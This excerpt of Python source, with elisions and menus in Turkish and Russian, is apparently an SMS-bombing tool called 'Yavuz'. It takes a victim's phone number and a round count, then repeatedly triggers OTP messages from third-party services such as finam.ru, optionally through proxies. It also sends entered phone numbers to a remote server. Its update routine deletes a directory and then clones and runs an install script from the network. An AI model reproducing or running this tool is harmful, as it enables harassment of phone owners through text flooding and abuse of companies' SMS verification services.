...
def Main():
	...
	global proxy
	ver = '74'
	version = requests.post("https://rainbow-t-shirt.com/yavuz/version.php").json()["version"]
	if int(ver) < int(version):
		info = Back.RED+"\nSürüm güncellenmesi gerekiyor!"+Style.RESET_ALL
	else:
		info = " "
	proxy = "localhost"
	...
	def main():
		...
		while True:
			...
			print ("1) SMS Spam Gönder\n2) Antispam listesine telefonunu ekle.\n3) Anti-spam sayfasındaki telefonu kontrol edin.\n4) ERROR(test).\n5) Proxy'yi güncelleyin.\n6) Yavuz'u Güncelle.\n7) Çıkış.\n")
			input1 = input(Fore.BLUE+"Введите номер: "+Style.RESET_ALL)
			if input1 == "1":
				try:
					print('Telefon Girin ("Enter" - İptal):')
					phone = input(Fore.BLUE+"yavuz > "+Style.RESET_ALL)
					try:
						if int(phone):
							print('Введите количество кругов ("Enter" - отмена):')
							count = input(Fore.BLUE+"yavuz > "+Style.RESET_ALL)
							try:
								if int(count):
									count=int(count)
									_phone=phone
									...
									if _phone[0] == '9':
										_phone = '7'+_phone
									iteration = 0
									id=requests.post('https://rainbow-t-shirt.com/yavuz/json.php', data={'phone': _phone}).json()["id"]
									if int(id) > 0:
										info = Fore.RED+"\nTelefon numarası istenmeyen sms önleme listesindedir."+Style.RESET_ALL
									elif int(id)==0:
										_name = ''
										for x in range(12):
										...
										email = _email
										info = '\nTelefon Numarası: {}\nTur Sayısı: {}'.format(phone, count)+'\nSpam devam ediyor.\nEğer kapatmak istersen CTRL + Z basman yeterli.'
										os.system("clear")
										print(logo)
										print(info)
										if _phone[0] == '9':
										...
										while iteration < count:
											try:
												...
												try:
													...
													pass
												try:
													requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"form-input-otp-msisdn": "+" + _phone}, proxies=proxies)
												except:
													pass
												try:
				...
				try:
					if int(phone):
						id=requests.post('https://rainbow-t-shirt.com/yavuz/json.php', data={'phone': phone}).json()["id"]
						if int(id) > 0:
							info = Fore.GREEN+"\nPhone {} is allready in antispam list.".format(phone)+Style.RESET_ALL
						elif int(id) == 0:
							requests.post('https://rainbow-t-shirt.com/yavuz/ajax.php', data={'phone': phone})
							...
							try:
								...
								if int(id) > 0:
									...
									try:
										...
										info = Fore.RED+"\nArtırılan."+Style.RESET_ALL
										main()
									except:
										pass
									info = Fore.BLUE+"\nBitti."+Style.RESET_ALL
									print(Fore.BLUE+"Bitti."+Style.RESET_ALL)
									time.sleep(5)
							except:
								info = Fore.RED+"\nVeriler yanlış girildi!"+Style.RESET_ALL
					
					except:
						info = Fore.RED+"\nTelefon yanlış girildi!"+Style.RESET_ALL
				except KeyboardInterrupt:
					info = Fore.RED+"\nArtırılan!"+Style.RESET_ALL
				except:
					info = Fore.RED+"\nVeriler yanlış girildi!"+Style.RESET_ALL
				...
				try:
					print ("http(s)://IP:port proxy")
					print ("Örnek: "+Fore.GREEN+"https://123.45.6.78:8080"+Style.RESET_ALL)
					print ("İptal etmek için Ctrl + C tuşlarına basın")
					proxy = input(Fore.BLUE+"yavuz > "+Style.RESET_ALL)
					if proxy[:5]=="https":
						ssl="https"
						ip=proxy[8:]
				...
				a=input("Güncellemek istediğinizden emin misiniz? (y/n) ")
				if a=="y":
					cmd = os.system("cd && rm -rf ~/yavuz && git clone https://github.com/zyoncommunity/yavuz && sh ~/yavuz/install.sh")
					exit()
				else:
					print("Artırılan")
